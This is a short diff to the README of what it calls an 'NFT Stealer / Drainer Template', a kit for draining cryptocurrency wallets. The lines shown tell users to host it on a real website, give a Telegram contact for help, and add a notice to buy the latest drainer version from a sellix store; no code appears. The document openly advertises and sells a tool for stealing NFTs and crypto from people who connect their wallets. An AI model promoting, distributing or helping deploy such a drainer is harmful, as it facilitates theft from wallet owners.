@@ -1,6 +1,8 @@
 
 # ⚠️ You need to host it on a real website for it to work! For help contact me on telegram https://t.me/CCalme
 
+# ⚠️This drainer might be outdated, buy the lastest version on rich.sellix.io
+
 ## 🖼️ NFT Stealer / Drainer Template !
 
 ![preview](https://media.discordapp.net/attachments/693931377170579556/980531787518324816/unknown.png?width=1752&height=915)
